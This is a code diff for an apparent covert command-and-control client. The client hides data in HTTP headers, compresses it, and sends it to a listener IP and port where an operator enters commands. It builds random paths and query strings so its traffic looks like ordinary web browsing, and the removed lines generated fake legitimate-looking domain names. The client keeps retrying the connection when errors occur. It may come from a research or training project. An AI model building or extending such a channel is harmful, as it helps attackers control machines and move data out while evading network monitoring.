@@ -18,30 +18,18 @@ from utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME, CLIENT_MAX_MESS
 # Time in seconds to wait for a http response before a timeout occurs.
 # This time should be long, to give user ample time to input their commands into the listener. 
 REQUEST_TIMEOUT = 300
-# The URL of the listener (should no longer be needed)
-# LISTENER_ROOT_URL = f'http://{LISTENER_IP}:{LISTENER_PORT}'
-
+# 0 is fastest but least compression, 9 is slowest but best compression.
+ZLIB_COMPRESSION_LEVEL = 9 
 
 def get_random_url():
     """
-    Generates a URL that appears to belong to different legitimate websites while
-    still pointing traffic to the same listener IP and port.
+    Generates a URL pointing to the listener ip and port, but with random path and query parameters specified.
+    This is meant to simulate varied web traffic (it would make sense for the client to interact with different
+    pages on the website, not the same page repeatedly)
     """
-    domains = [
-        "secure-payments", "login-portal", "webmail", "dashboard",
-        "banking-secure", "internal-system", "file-transfer", "support-desk",
-        "newsfeed-blog", "cloud-storage", "vpn-access", "updates-server"
-    ]
-
-    tlds = [".com", ".net", ".org", ".io", ".co", ".tech", ".app"]
-
-    # Generate a fake domain name
-    fake_domain = random.choice(domains) + random.choice(tlds)
-
     # Generate a random path
     paths = ["login", "dashboard", "profile", "settings", "checkout", "verify", "update"]
-    extensions = [".html", ".php", ".asp", ""]
-    path = random.choice(paths) + random.choice(extensions)
+    path = random.choice(paths)
 
     # Random query parameters
     query_params = ["id", "user", "session", "ref", "token", "category"]
@@ -55,8 +43,7 @@ def get_random_url():
     else:
         query_string = ""
 
-    # Construct the fake-looking URL (but with real IP and port)
-    return f"http://{LISTENER_IP}:{LISTENER_PORT}/{path}{query_string}", fake_domain
+    return f"http://{LISTENER_IP}:{LISTENER_PORT}/{path}{query_string}"
 
 def create_requests(data: str):
     '''
@@ -83,9 +70,12 @@ def create_requests(data: str):
         return data.encode()
 
     def compress_data(data: bytes):
-        return zlib.compress(data)
+        return zlib.compress(data, ZLIB_COMPRESSION_LEVEL)
     
     def add_request_flags(request: Request, flags: RequestFlags):
+        '''
+        Store request flags data in the packet
+        '''
         if RequestFlags.IS_NOT_COMPRESSED in flags:
             request.headers["IS_NOT_COMPRESSED"] = "1"
         if RequestFlags.IS_END_OF_MESSAGE in flags:
@@ -157,7 +147,6 @@ def send_stego_data_to_listener(data: str):
                     response = session.send(request.prepare())
             return response
         except Exception as e:
-            raise e
             print(e)
             sleep(5) # Ensures connection retries aren't sent too frequently
             continue
